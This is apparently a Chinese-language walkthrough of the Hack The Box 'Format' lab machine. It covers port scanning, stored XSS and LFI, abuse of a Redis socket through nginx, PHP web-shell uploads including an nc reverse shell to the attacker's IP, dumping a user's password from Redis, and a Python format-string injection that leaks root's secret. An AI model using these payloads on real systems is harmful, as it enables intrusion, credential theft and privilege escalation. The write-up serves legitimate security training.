# Format

目标探测

Nmap扫描目标全端口的开放端口

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/HTB/Format]
└─# nmap -n -v -sS -p- 10.10.11.213 --max-retries=0 -oN allport.txt -Pn
# Nmap 7.94 scan initiated Thu Aug 31 04:33:31 2023 as: nmap -n -v -sS -p- --max-retries=0 -oN allport.txt -Pn 10.10.11.213
Warning: 10.10.11.213 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.11.213
Host is up (0.45s latency).
Not shown: 37673 closed tcp ports (reset), 27859 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Aug 31 04:43:48 2023 -- 1 IP address (1 host up) scanned in 617.53 seconds
```

对这三个端口进行详细扫描

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/HTB/Format]
└─# nmap -n -v -sC -sV -p $(cat allport.txt | grep ^[0-9]|cut -d / -f1|tr '\n' ','|sed s/,$//) 10.10.11.213 -oN nmap.txt -Pn
# Nmap 7.94 scan initiated Thu Aug 31 04:49:25 2023 as: nmap -n -v -sC -sV -p 22,80,3000 -oN nmap.txt -Pn 10.10.11.213
Nmap scan report for 10.10.11.213
Host is up (0.52s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c3:97:ce:83:7d:25:5d:5d:ed:b5:45:cd:f2:0b:05:4f (RSA)
|   256 b3:aa:30:35:2b:99:7d:20:fe:b6:75:88:40:a5:17:c1 (ECDSA)
|_  256 fa:b3:7d:6e:1a:bc:d1:4b:68:ed:d6:e8:97:67:27:d7 (ED25519)
80/tcp   open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD
3000/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://microblog.htb:3000/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 31 04:50:21 2023 -- 1 IP address (1 host up) scanned in 56.17 seconds
```

在端口 3000 上，它将我们重定向到microblog.htb域，因此我们将其添加到 /etc/hosts, 如果我们尝试通过端口 80 访问该网站，它会将我们重定向到app.microblog.htb子域，因此我们也添加它,我们访问主网站，在本例中是子域。

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

我们在网站上注册，创建一个子域并将其添加到/etc/hosts。

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/HTB/Format]
└─# cat /etc/hosts                                                            
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.213    app.microblog.htb
10.10.11.213    microblog.htb
10.10.11.213    myawesomeblog.microblog.htb
```

<figure><img src="../../../.gitbook/assets/image (76) (1).png" alt=""><figcaption></figcaption></figure>

添加后，我们可以编辑子域，因此我们尝试创建 XSS。

<figure><img src="../../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

我们可以看到，这是一个 XSS Stored

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

我们尝试从子域的 TXT 记录捕获请求并尝试执行 LFI，_id_字段容易受到 LFI 的攻击，我们发现了 2 个用户：**cooper**和**git**

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

我们通过端口3000访问网络，它是一个Gitea，用户**Cooper**有一个存储库。正如我们在图片中看到的，这些是网站文件和子域，因此我们查看代码以查找漏洞。

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

在第25行和第35行之间我们可以发现这部分代码非常有趣。我们可以看到，如果_isPro_条件为_True_，那么我们可以上传某种类型的文件，尽管它们可能只是图像。无论如何，我们必须成为_专业人士_才能将文件上传到网络。

```
function provisionProUser() {
    // 检查用户是否为专业用户
    if (isPro() === "true") {
        // 获取并清理博客名称
        $blogName = trim(urldecode(getBlogName()));

        // 为博客目录和其编辑子目录添加写权限
        system("chmod +w /var/www/microblog/" . $blogName);
        system("chmod +w /var/www/microblog/" . $blogName . "/edit");

        // 将bulletproof.php文件复制到博客的编辑子目录中
        system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");

        // 创建一个名为"uploads"的子目录，并设置其权限
        system("mkdir /var/www/microblog/" . $blogName . "/uploads && chmod 700 /var/www/microblog/" . $blogName . "/uploads");

        // 移除博客目录和编辑子目录的写权限
        system("chmod -w /var/www/microblog/" . $blogName . "/edit && chmod -w /var/www/microblog/" . $blogName);
    }
    return;
}

```

服务器通过 REDIS 工作，为了将我们的帐户转换为_Pro_，我们必须指向套接字并采用 HSET 格式。HSET 基本上你所做的就是更改指定字段的值。

如果您在注册时输入了任何其他用户名，请确保在 cmd 中更改该用户名，我使用 hyper，作为用户名，所以我使用了 hyper

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/HTB/Format]
└─# curl -X HSET "http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%2Fredis.sock:hyper%20pro%20true%20a/b"
```

一旦我们成为专业用户，我们就通过Burpsuite发送请求并 ping攻击者的机器，可以看到已经成为Pro

<figure><img src="../../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

```
id=/var/www/microblog/hyper/uploads/test.php&txt=<%3fphp+echo+shell_exec("ping+-c+1+10.10.16.18")%3b%3f>
```

<figure><img src="../../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

我们通过tun0接口监听 ICMP 跟踪。请求发送后，我们必须访问以下网站路线。

```
┌──(root㉿kali)-[~]
└─# sudo tcpdump -n -i tun0 icmp                                                                              
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

发送请求后，我们必须访问以下 Web 路径才能执行 PHP 代码。

<figure><img src="../../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

如果一切正确，我们将收到受害计算机的 ICMP 跟踪，从而验证我们是否有能力执行命令。

```
┌──(root㉿kali)-[~]
└─# sudo tcpdump -n -i tun0 icmp                                                                              
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
03:35:47.512285 IP 10.10.11.213 > 10.10.16.18: ICMP echo request, id 2100, seq 1, length 64
03:35:47.512349 IP 10.10.16.18 > 10.10.11.213: ICMP echo reply, id 2100, seq 1, length 64
```

我们向攻击者机器发送一个反向 shell 。

```
id=/var/www/microblog/hyper/uploads/shell.php&txt=<%3fphp+echo+shell_exec("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.16.18+4444+>/tmp/f")%3b%3f>
```

<figure><img src="../../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

访问shell.php以执行shell.php

```
┌──(root㉿kali)-[~]
└─# nc -lnvp 4444                                                      
listening on [any] 4444 ...
connect to [10.10.16.18] from (UNKNOWN) [10.10.11.213] 49978
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

如果我们运行 pspy 并看到一个有趣的 redis 进程。

```
$ ps -aux | grep redis
redis        601  0.1  0.3  65164 15232 ?        Ssl  14:30   0:17 /usr/bin/redis-server 127.0.0.1:0
```

对于用户，我们必须使用socks配置文件连接到redis-cli

```
www-data@format:/home/cooper$ redis-cli -s /run/redis/redis.sock 
redis /run/redis/redis.sock> KEYS *
1) "cooper.dooper:sites"
2) "cooper.dooper"
redis /run/redis/redis.sock> TYPE cooper.dooper
hash
```

我们在第 4 行获取了用户**cooper**的密码。

```
redis /run/redis/redis.sock> HGETALL cooper.dooper
 1) "username"
 2) "cooper.dooper"
 3) "password"
 4) "zooperdoopercooper"
 5) "first-name"
 6) "Cooper"
 7) "last-name"
 8) "Dooper"
 9) "pro"
10) "false"
```

### 权限提升

我们通过 SSH 与用户**cooper**连接并读取该flag。

```
┌──(root㉿kali)-[~]
└─# ssh cooper@10.10.11.213                    
The authenticity of host '10.10.11.213 (10.10.11.213)' can't be established.
ED25519 key fingerprint is SHA256:30cTQN6W3DKQMMwb5RGQA6Ie1hnKQ37/bSbe+vpYE98.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.213' (ED25519) to the list of known hosts.
cooper@10.10.11.213's password: 
Linux format 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon May 22 20:40:36 2023 from 10.10.14.40
cooper@format:~$ cat user.txt
********************************
```

我们可以使用 sudo 运行_许可证_文件，让我们看看它是什么。

```
cooper@format:~$ sudo -l
[sudo] password for cooper: 
Matching Defaults entries for cooper on format:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cooper may run the following commands on format:
    (root) /usr/bin/license
```

我们可以看到这是一个python脚本。

```
cooper@format:~$ cat /usr/bin/license
#!/usr/bin/python3

import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
import random
import string
from datetime import date
import redis
import argparse
import os
import sys

class License():
    def __init__(self):
        chars = string.ascii_letters + string.digits + string.punctuation
        self.license = ''.join(random.choice(chars) for i in range(40))
        self.created = date.today()

if os.geteuid() != 0:
    print("")
    print("Microblog license key manager can only be run as root")
    print("")
    sys.exit()

parser = argparse.ArgumentParser(description='Microblog license key manager')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-p', '--provision', help='Provision license key for specified user', metavar='username')
group.add_argument('-d', '--deprovision', help='Deprovision license key for specified user', metavar='username')
group.add_argument('-c', '--check', help='Check if specified license key is valid', metavar='license_key')
args = parser.parse_args()

r = redis.Redis(unix_socket_path='/var/run/redis/redis.sock')

secret = [line.strip() for line in open("/root/license/secret")][0]
secret_encoded = secret.encode()
salt = b'microblogsalt123'
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend())
encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))

f = Fernet(encryption_key)
l = License()

#provision
if(args.provision):
    user_profile = r.hgetall(args.provision)
    if not user_profile:
        print("")
        print("User does not exist. Please provide valid username.")
        print("")
        sys.exit()
    existing_keys = open("/root/license/keys", "r")
    all_keys = existing_keys.readlines()
    for user_key in all_keys:
        if(user_key.split(":")[0] == args.provision):
            print("")
            print("License key has already been provisioned for this user")
            print("")
            sys.exit()
    prefix = "microblog"
    username = r.hget(args.provision, "username").decode()
    firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
    print("")
    print("Plaintext license key:")
    print("------------------------------------------------------")
    print(license_key)
    print("")
    license_key_encoded = license_key.encode()
    license_key_encrypted = f.encrypt(license_key_encoded)
    print("Encrypted license key (distribute to customer):")
    print("------------------------------------------------------")
    print(license_key_encrypted.decode())
    print("")
    with open("/root/license/keys", "a") as license_keys_file:
        license_keys_file.write(args.provision + ":" + license_key_encrypted.decode() + "\n")

#deprovision
if(args.deprovision):
    print("")
    print("License key deprovisioning coming soon")
    print("")
    sys.exit()

#check
if(args.check):
    print("")
    try:
        license_key_decrypted = f.decrypt(args.check.encode())
        print("License key valid! Decrypted value:")
        print("------------------------------------------------------")
        print(license_key_decrypted.decode())
    except:
        print("License key invalid")
    print("")
```

如果我们读取该文件，我们就可以执行[Python 格式字符串漏洞](https://podalirius.net/en/articles/python-format-string-vulnerabilities/)。format 函数存在漏洞

1. 使用redis-cli注册一个用户，利用username中的上述漏洞打印所有变量。

<pre><code><strong>HSET test2 username test1 password test first-name {license.__init__.__globals__} last-name test pro false
</strong></code></pre>

2. 现在以 sudo 身份运行 /usr/bin/license 来配置 test2 用户的许可证

<pre data-overflow="wrap"><code>cooper@format:~$ redis-cli -s /var/run/redis/redis.sock 
redis /var/run/redis/redis.sock> HSET test2 username test1 password test first-name {license.__init__.__globals__} last-name test pro false
(integer) 5
redis /var/run/redis/redis.sock> exit
cooper@format:~$ sudo /usr/bin/license -p test2

Plaintext license key:
------------------------------------------------------
microblogtest1Sv/{g%\y!,(qP/#~w4MCRM&#x3C;Z_s.t;H"^J7'*UK^&#x26;{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': &#x3C;_frozen_importlib_external.SourceFileLoader object at 0x7f5e0cb0bc10>, '__spec__': None, '__annotations__': {}, '__builtins__': &#x3C;module 'builtins' (built-in)>, '__file__': '/usr/bin/license', '__cached__': None, 'base64': &#x3C;module 'base64' from '/usr/lib/python3.9/base64.py'>, 'default_backend': &#x3C;function default_backend at 0x7f5e0c95e430>, 'hashes': &#x3C;module 'cryptography.hazmat.primitives.hashes' from '/usr/local/lib/python3.9/dist-packages/cryptography/hazmat/primitives/hashes.py'>, 'PBKDF2HMAC': &#x3C;class 'cryptography.hazmat.primitives.kdf.pbkdf2.PBKDF2HMAC'>, 'Fernet': &#x3C;class 'cryptography.fernet.Fernet'>, 'random': &#x3C;module 'random' from '/usr/lib/python3.9/random.py'>, 'string': &#x3C;module 'string' from '/usr/lib/python3.9/string.py'>, 'date': &#x3C;class 'datetime.date'>, 'redis': &#x3C;module 'redis' from '/usr/local/lib/python3.9/dist-packages/redis/__init__.py'>, 'argparse': &#x3C;module 'argparse' from '/usr/lib/python3.9/argparse.py'>, 'os': &#x3C;module 'os' from '/usr/lib/python3.9/os.py'>, 'sys': &#x3C;module 'sys' (built-in)>, 'License': &#x3C;class '__main__.License'>, 'parser': ArgumentParser(prog='license', usage=None, description='Microblog license key manager', formatter_class=&#x3C;class 'argparse.HelpFormatter'>, conflict_handler='error', add_help=True), 'group': &#x3C;argparse._MutuallyExclusiveGroup object at 0x7f5e0b5047c0>, 'args': Namespace(provision='test2', deprovision=None, check=None), 'r': Redis&#x3C;ConnectionPool&#x3C;UnixDomainSocketConnection&#x3C;path=/var/run/redis/redis.sock,db=0>>>, '__warningregistry__': {'version': 0}, 'secret': '<a data-footnote-ref href="#user-content-fn-1">unCR4ckaBL3Pa$$w0rd</a>', 'secret_encoded': b'unCR4ckaBL3Pa$$w0rd', 'salt': b'microblogsalt123', 'kdf': &#x3C;cryptography.hazmat.primitives.kdf.pbkdf2.PBKDF2HMAC object at 0x7f5e0b504e50>, 'encryption_key': b'nTXlHnzf-z2cR0ADCHOrYga7--k6Ii6BTUKhwmTHOjU=', 'f': &#x3C;cryptography.fernet.Fernet object at 0x7f5e0b5295e0>, 'l': &#x3C;__main__.License object at 0x7f5e0b5296d0>, 'user_profile': {b'username': b'test1', b'password': b'test', b'first-name': b'{license.__init__.__globals__}', b'last-name': b'test', b'pro': b'false'}, 'existing_keys': &#x3C;_io.TextIOWrapper name='/root/license/keys' mode='r' encoding='UTF-8'>, 'all_keys': ['cooper.dooper:gAAAAABjZbN1xCOUaNCV_-Q12BxI7uhvmqTGgwN12tB7Krb5avX5JdSzE2dLKX53ZpHxHrzpNnAwQ6g1FTduOtBAl4QYRWF27A2MPfedfMzgNZrv_VqUwCAfzGZeoQCv1-NBIw6GaoCA0yIMPl0o3B6A2_Hads32AsdDzOLyhetqrr8HUgtLbZg=\n'], 'user_key': 'cooper.dooper:gAAAAABjZbN1xCOUaNCV_-Q12BxI7uhvmqTGgwN12tB7Krb5avX5JdSzE2dLKX53ZpHxHrzpNnAwQ6g1FTduOtBAl4QYRWF27A2MPfedfMzgNZrv_VqUwCAfzGZeoQCv1-NBIw6GaoCA0yIMPl0o3B6A2_Hads32AsdDzOLyhetqrr8HUgtLbZg=\n', 'prefix': 'microblog', 'username': 'test1', 'firstlast': '{license.__init__.__globals__}test'}test

Encrypted license key (distribute to customer):
------------------------------------------------------
gAAAAABk9UoYPiGCP4mZyXMBYnL_onVM1VF8pVZ1z5DAZkC0i64-ZnSTN4T-kog2Z5vlSVjpJh3THDtzJ6e2LkH2vQV7AArrCC33J4HhAuceYHWNVmzN2Aga0aTgttDmuvM8W9IQEqf6i-68ECJucdFlt9UAoXmbXDMWLKyVNx78Qo8FxRwrhJvsh7ZGuZTYuQ5ahw9ncNg3zwLiZCIjxxFxncqvxKpxXO3uJ4Munc9Vz2_jyFtNZ4jryGZdM7JZwMqYhN7-173zrXxYFqor3JpNPc3Bi2It4clteEhSmmo1o41TamirVPUwXscjlDOGkSe_eDJNNFLq9Wq33ErrCp7AupGTghb8Ufjur4i4g53oIKU5DsiVY5zNyDIPZqME3fjVBc9Uz1P9LUOEnFkY2Gi8H64o_WMDmQpFR0SerC4S9-RcbSSA9ejQfC_oSIxe1sfvOi-a6Qp9nw__I1LVKq6rfHbwUdUAox9d8_Y2ihVX4ImJ8o1SM37N7hKldQaeWvRk2pxw4kcqxy6udE-AbuR7ystwGsRaTGTp6GEJb3AM5n0NltxaF0dtTAlZR52rTLNdsaP979Bxeq0wAw-7aOLQz4KlUiYZAJrzuTfueGqF9yY1W66LWYi1k24eB04N8x41rY46NcyamUQtVmBS6FmgAOGT9OSZNrpnt4F7jFrPBTMtV71P1mnrX_sT1PY1-V5nK_6UerbJFsot0t8MeXpc4BFmkYNC0ytQ6y8QA76U54lXhvkFJrW7UwGS9ymOK1mVVyJPdzFRWelgT7uQLbKxx303-xx1VzMB_oHDKlGDz9aFl6v3EvhE15u2h3PpxlrkeuS88yWefteEdu18W_jjAQtMqayrdJI7w_5TbGF5KcBWGxBCtL_SsEyO4jAIiGMglwMT2EAYxX3WEfDetJ4zfQgCL--1MN3siVyVfomHLSSk3xzUV76do6w7g-HMKDvtYEnVQ1iF27vCK66lSQt-50pQhr6R_nIGoCxvypTXlrwMEWbrnbsAjgSSxphq3SWuQ6vQntHROtGxEq3k-1rcgcaFsBk_pCrRWl4_VUMcS_tWvvmSlvUPu9yLX1vObwPz31MgIxms49QKyr_zuoT8rOz0jChbU56001efgdXiI41NliYCY9WxlX-w1nPDGaGMLm7jgCecO4UlCC_zFAsz5-zLbaM1hCLdlPqgf1g7D-qAt6z14n8TgFFYNknuO1q33eMKQcTq-Uxxtv6Jl31MPRtbFuazhQzE1sAoUNfMlZYB3j4YhQ4IxEeZYl8zsU0kinh6T3Hfalpn5_AJ5MuKeyV6_ThR7QJPVtWzfsOPd9nx04858SSGdzA1xqKzn8vhWSRghT6i_QxwrkaP72uIZv3praBRBxLutKLO3yP-lMW8JkhvSYU49Tm_V9AVUcNWikCyCXnQg_Cb40s9TsqddPPoVfcRozslzXhs9inU9CgZS26TFsOaSKOeueoQ4TbkLpMHKSqHstnReM0DMCLK5h8HoY-xrhwJLpXfFs_q4MQQ_nlxLBzPToYdyZWwfCopSxD1dtcEDa1RauPfPmduORoZHwgu-ZDMe1xccq0JNE8k2imvkSBhN32eGsCLUC7A2IC3GPxA09XCt78cKv2Kcq1x8Gf8MW8DFQwbDqQ4zBgcgTWVngR7fM9lTQ90kB0bQmDn8lZOHH5P63Kj0Ij2GC3HdCG3dpUnCHnqRAMiMjB2gfyW4wnVBjpI98G9vPZ5NDpk1C5VZSOGDxLdqADHNg_Ha2SnKSFjKK3b0qIb-LFeg1l5c5IDvrRtlz8XInhp3zI8AKffdWSFVq4eT8zLevqpM6yVNDxzwDQoaJmKS55aa1kamtv8vBcS0w_O8sjT80lwWhtWh-_NZewkZlqA7Mcq0Jt7x4wXcrWhajkBAryLiXnsyrWCJSviYYpvu72jVfhA6SWh1MJ0R4_HxOEwsv_3TxtUDFWtoCARkrV9YF1VqjGgRFt1m50yNO0B7-g3Fw_-xTpX6CrX66fcM66khenyfRkwHbUZPi248VooAumjKIp7G0TCV_dwoFx09mqBggW6iu8EFLtZoUMiRTKqs5LZcPQaH7cQLpIV3pA45lp68e1b86ot7tTEB-oMh4s6bsYh8Su_EipLS0EusaWeUlHBDHSaR5Wnml8htXblZfY1MbVgms-9uS3exXb_GW1JJadBWLje4l-BtS_kJSTjHajz4nHPrY0CZpMfSwHVNes2Ww32UeeTLDhOycRvfsWRiaN1_-ypaLRhZ08SwOxuD0uodXY1nciOtQ9grTResHZ6UTgj4utmysJXAYQudlk6X2AMFIYDDEvwZMVWmxmLYVPub38PVSyBVM259z1qeuI0yPTGwE-FWBT4bvsAqtnaP8HOikkMMvNjHnZqjUvOB00eZ8egKLOmKiOuxjrFgDRFeq6fjMonBveDa636htGGB685UHT-kUE7Vi-NH3ALC1BKDBxd1S6G3gpAJUtWx0kRfq0KL3DMNXWLX0vxsPOq0aAOSOZ-5cf3bJY5jUHYAXQPRdXYZ0daYb-NzwfsCgSvGbidnjUPlUUyZTdf3UcJflD-gYGHzwFRW4fqi2JT_96-S8RUlz6qQ7TM_nkh9LF8mY1QfcAk11-GeJ4OowEnKqLIy7VLxeF9KUtj_3HNhpyvxbMwq-HTTv11viiBHUwUjY3bz1TgvPjUf0rpBmNJ0vCm-f1WaFxz0oSa61qP5svjfAmXmNIhID8PvIr9ElvBcHGi0-A1nyZrBuLPG4W3SY50HKDH9RWdjotlV-eqoWM0pNXhAA9XIStVXJDoTXnhwGlLDPCIubLh_p3jXXjfiIWes4RCWNr8Sf5DnivcU0cuGerUioKIpYRQqUXDdOXKj0E06PlzR9NS19HQPTg-4YiUNzEpZGUfQITKMGUrFmGUyfRpWaX5hZktW3FmdZIIZatR7UjA78big6hf0BMu-eLkf_iCe1JeOphJb_11KASid7UX0CkuqothpqB2QWJ3NTg9Z9SGgkfphBInK90a95aK-tIIMCMDaPIkjqEEbJBCvSzegVEmi6hMvoyrxTTkEFO595rbN77lvuo6q0L__Im0-U17yn6AGZdIFvQdLdWD_S57CCCTijQEk474MjegCqjDnvg-QXaMPoGqkBeulmeYvvlbt6XN-SqPs_4T3lpY0ib3JemvhfJM-N84nvEb8Glq-UJJrxjxojA06Kk3YCTEunGzmFO_bXg__FG2-YUZq_5zSmgX-aflGjYL-uMmbEPgSijXAo3kmtD4A8mNfVtmt2R-J54jiRjTUHvLwlKz9iuf-yAgCclLM3bTrif4UaREOzRj-4wauEWti5r7qSCjH-x4326UOf2RogG5Yk2hHItpI64uPFJ-YqyqVQe9WqTXQk2lq6a7Gcx8D7WSDVm3WDlK0C6h46rHvB7mzJm9KhzNvr_OH2KPbbAdYEHQnCZ5C5ZF4gbdkJL5Xzx4MU9BgG3puAmXo4fc8PfaTGOf8ZtO3xR96wDT2zOFn_fBNtOaBsE8ZoBc5TB134WpRXmgW8JnuBFkYD_PI7J3umyE1JdjrPl1sqjQbXwu5hT7d2uVWkwaCP1S3ivKx9xnBnkphDUcwNJAN6G_5HvXtFkiF8nJTGI0mv211ggwm8l7KIpxydiqek0kbcTmnum-iX6TL7m0Aax3yrOqCkjUkotK4rlQhiF8_0tNmiqySV57cCmMJ5WEYEzr5-aFkUhaw1CDbI4b16wPr83VY0FwfitPPVrqYoaxwuwm9CqhNEHERWwp1FPUK-S0pkvOzlz9nZDgU34hjtkeMCQXWBCQ7fBGpD2fqfxtqU9BgGAft8wYSpC4vQo=
</code></pre>

我们与**root**连接并读取标志。

```
cooper@format:~$ su root
Password: 
root@format:/home/cooper#
root@format:~# cat root.txt
********************************
```

[^1]: 
